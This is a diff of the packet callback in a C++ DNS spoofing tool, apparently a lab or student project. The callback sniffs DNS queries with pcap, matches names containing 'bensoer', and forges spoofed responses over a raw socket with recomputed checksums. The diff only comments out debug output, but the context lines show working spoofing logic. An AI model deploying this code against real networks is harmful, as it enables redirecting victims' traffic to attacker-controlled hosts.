@@ -73,11 +73,11 @@ void NetworkMonitor::setFilter(string filter) {
  */
 void NetworkMonitor::packetCallback(u_char* ptrnull, const struct pcap_pkthdr *pkt_info, const u_char *packet){
 
-    Logger::debug("Packet Found. Now Parsing");
+    //Logger::debug("Packet Found. Now Parsing");
 
     //struct sniff_ethernet * ethernet = (struct sniff_ethernet*)(packet);
     struct iphdr * ip = (struct iphdr*)(packet + SIZE_ETHERNET);
-    printf("Total Length At Recv: %d\n", ntohs(ip->tot_len));
+    //printf("Total Length At Recv: %d\n", ntohs(ip->tot_len));
 
     //switch the ip now to save us work later
 
@@ -89,17 +89,16 @@ void NetworkMonitor::packetCallback(u_char* ptrnull, const struct pcap_pkthdr *p
     char oldIPDestination[INET_ADDRSTRLEN];
     inet_ntop(AF_INET, &da, oldIPDestination, INET_ADDRSTRLEN);
 
-    printf("Source: %s\n", oldIPSource);
-    printf("Destination: %s\n", oldIPDestination);
+    //printf("Source: %s\n", oldIPSource);
+    //printf("Destination: %s\n", oldIPDestination);
 
 
     u_int32_t tmp = ip->saddr;
     ip->saddr = ip->daddr;
-    //ip->saddr = inet_addr("192.168.10.10");
     ip->daddr = tmp;
     ip->ttl = 64;
 
-    printf("IP ID: %d\n", ntohs(ip->id));
+    //printf("IP ID: %d\n", ntohs(ip->id));
     ip->id = htons((rand() % 11000) + 29000);
     ip->frag_off = 0;
 
@@ -107,9 +106,9 @@ void NetworkMonitor::packetCallback(u_char* ptrnull, const struct pcap_pkthdr *p
     //u_int size_ip = sizeof(*ip) + 2;
     u_int size_ip2 = (ip->ihl & 0xf) * 4;
     u_int size_ip = (ip->ihl) * 4;
-    printf("IHL: %d\n", ip->ihl);
-    printf("size_ip2: %d\n", size_ip2);
-    printf("size_ip: %d\n", size_ip);
+    //printf("IHL: %d\n", ip->ihl);
+    //printf("size_ip2: %d\n", size_ip2);
+    //printf("size_ip: %d\n", size_ip);
 
     struct udphdr * udp = (struct udphdr *)(packet + SIZE_ETHERNET + size_ip);
 
@@ -159,23 +158,23 @@ void NetworkMonitor::packetCallback(u_char* ptrnull, const struct pcap_pkthdr *p
     dns->ra = 0;
 
 
-    cout << "---------------------------------------------" << endl;
-    cout << "Structures Found Over Packet" << endl;
+    //cout << "---------------------------------------------" << endl;
+    //cout << "Structures Found Over Packet" << endl;
 
-    cout << "Source IP: " << string(oldIPSource) << endl;
-    cout << "Destination IP: " << string(oldIPDestination) << endl;
+    //cout << "Source IP: " << string(oldIPSource) << endl;
+    //cout << "Destination IP: " << string(oldIPDestination) << endl;
 
-    cout << "Source Port: " << oldSource << endl;
-    cout << "Destination Port: " << oldDest << endl;
+    //cout << "Source Port: " << oldSource << endl;
+    //cout << "Destination Port: " << oldDest << endl;
 
-    cout << "Transaction ID: " << ntohs(dns->id) << endl;
-    cout << "Questions: " << ntohs(dns->q_count) << endl;
-    cout << "Answer RRs: " << ntohs(dns->ans_count) << endl;
-    cout << "Authority RRs: " << ntohs(dns->auth_count) << endl;
-    cout << "Additional RRs: " << ntohs(dns->add_count) << endl;
+    //cout << "Transaction ID: " << ntohs(dns->id) << endl;
+    //cout << "Questions: " << ntohs(dns->q_count) << endl;
+    //cout << "Answer RRs: " << ntohs(dns->ans_count) << endl;
+    //cout << "Authority RRs: " << ntohs(dns->auth_count) << endl;
+    //cout << "Additional RRs: " << ntohs(dns->add_count) << endl;
 
-    cout << "RAW Query Content: " << endl;
-    cout << ">" << string(query) << "<" << endl;
+    //cout << "RAW Query Content: " << endl;
+    //cout << ">" << string(query) << "<" << endl;
 
     int index = 0;
     QUERY * questionsList = new QUERY[ntohs(dns->q_count)];
@@ -235,9 +234,9 @@ void NetworkMonitor::packetCallback(u_char* ptrnull, const struct pcap_pkthdr *p
         questionQuery->ques = question;
         questionsList[index++] = (*questionQuery);
 
-        cout << "Full Query Name: " << questionQuery->name << endl;
-        cout << "Class " << ntohs(questionQuery->ques->qclass) << endl;
-        cout << "Type " << ntohs(questionQuery->ques->qtype) << endl;
+        //cout << "Full Query Name: " << questionQuery->name << endl;
+        //cout << "Class " << ntohs(questionQuery->ques->qclass) << endl;
+        //cout << "Type " << ntohs(questionQuery->ques->qtype) << endl;
 
         if(questionQuery->name.find("bensoer") != string::npos){
             foundURL = true;
@@ -247,14 +246,14 @@ void NetworkMonitor::packetCallback(u_char* ptrnull, const struct pcap_pkthdr *p
 
     }
 
-    cout << "ALL DONE PARSING PACKET. NOW CHECKING IF SHOULD SPOOF" << endl;
+    //cout << "ALL DONE PARSING PACKET. NOW CHECKING IF SHOULD SPOOF" << endl;
     if(foundURL){
-        cout << "REQUEST BELONGS TO DESIRED SPOOF. SENDING RESPONSE" << endl;
+        //cout << "REQUEST BELONGS TO DESIRED SPOOF. SENDING RESPONSE" << endl;
     }else{
         return;
     }
 
-    cout << "NOW TO SEND THE RESPONSE" << endl;
+    //cout << "NOW TO SEND THE RESPONSE" << endl;
 
     //make our response packet. get it ready
     char responsePacket[65535];
@@ -292,8 +291,8 @@ void NetworkMonitor::packetCallback(u_char* ptrnull, const struct pcap_pkthdr *p
     //recalc ip length
     struct iphdr * rip = (struct iphdr*)(responsePacket);
     rip->tot_len = htons( ntohs(ip->tot_len) + (( ntohs(dns->q_count) * sizeof(struct R_DATA)) + questionListContentSize));
-    cout << "Original IP Length: " << ntohs(ip->tot_len) << endl;
-    cout << "Response IP Length: " << ntohs(rip->tot_len) << endl;
+    //cout << "Original IP Length: " << ntohs(ip->tot_len) << endl;
+    //cout << "Response IP Length: " << ntohs(rip->tot_len) << endl;
 
     rip->check = 0;
     rip->check = NetworkMonitor::instance->csum((unsigned short *) responsePacket, sizeof(struct iphdr));
@@ -302,8 +301,8 @@ void NetworkMonitor::packetCallback(u_char* ptrnull, const struct pcap_pkthdr *p
     struct udphdr * rudp = (struct udphdr *)(responsePacket + size_ip);
     unsigned short newLength = ntohs(udp->len) + ( ( ntohs(dns->q_count) * sizeof(struct R_DATA) ) + questionListContentSize);
     rudp->len = htons( ntohs(udp->len) + ( ( ntohs(dns->q_count) * sizeof(struct R_DATA) ) + questionListContentSize) );
-    cout << "Original UDP Length: " << ntohs(udp->len) << endl;
-    cout << "Response UDP Length: " << ntohs(rudp->len) << endl;
+    //cout << "Original UDP Length: " << ntohs(udp->len) << endl;
+    //cout << "Response UDP Length: " << ntohs(rudp->len) << endl;
 
 
     rudp->check = 0;
@@ -312,33 +311,21 @@ void NetworkMonitor::packetCallback(u_char* ptrnull, const struct pcap_pkthdr *p
     //calculate new checksum for pseudoheader
     psh.dest_address = sin.sin_addr.s_addr;
     psh.source_address = inet_addr(oldIPDestination);
-
-    //psh.dest_address = rip->daddr;
-    //psh.source_address = rip->saddr;
     psh.placeholder = 0;
     psh.protocol = IPPROTO_UDP;
     psh.udp_length = htons(newLength);
 
+    //pseudogram generation
     int psize = sizeof(struct pseudo_header) + newLength;
     char * pseudogram = (char *)malloc(psize);
-
-
-
     memcpy(pseudogram, (char*) &psh, sizeof(struct pseudo_header));
     memcpy(pseudogram + sizeof(struct pseudo_header), rudp, newLength);
 
     rudp->check = NetworkMonitor::instance->csum((unsigned short *) pseudogram, psize);
-    //memcpy(&psh.udp, rudp, sizeof(struct udphdr));
-    //rudp->check = NetworkMonitor::instance->csum((unsigned short *) pseudogram, psize);
-    //psh.udp.check = 0;
-    //psh.udp.uh_sum = 0;
-    //rudp->check = NetworkMonitor::instance->csum((unsigned short *) &psh, sizeof(pseudo_header));
-    //rudp->uh_sum = NetworkMonitor::instance->csum((unsigned short *) &psh, sizeof(pseudo_header));
 
-
-    printf("IP Checksum Hex: %x\n", rip->check);
-    printf("UDP Checksum Hex: %x\n", rudp->check);
-    printf("UDP Checksum Hex: %x\n", rudp->uh_sum);
+    //printf("IP Checksum Hex: %x\n", rip->check);
+    //printf("UDP Checksum Hex: %x\n", rudp->check);
+    //printf("UDP Checksum Hex: %x\n", rudp->uh_sum);
 
     //time to send this garbage
     ssize_t result = sendto(NetworkMonitor::instance->rawSocket, responsePacket, ntohs(rip->tot_len), 0, (struct sockaddr *) &sin, sizeof(sin));
@@ -347,7 +334,6 @@ void NetworkMonitor::packetCallback(u_char* ptrnull, const struct pcap_pkthdr *p
     }
 
     return;
-    //NetworkMonitor::instance->killListening();
 
 }
 
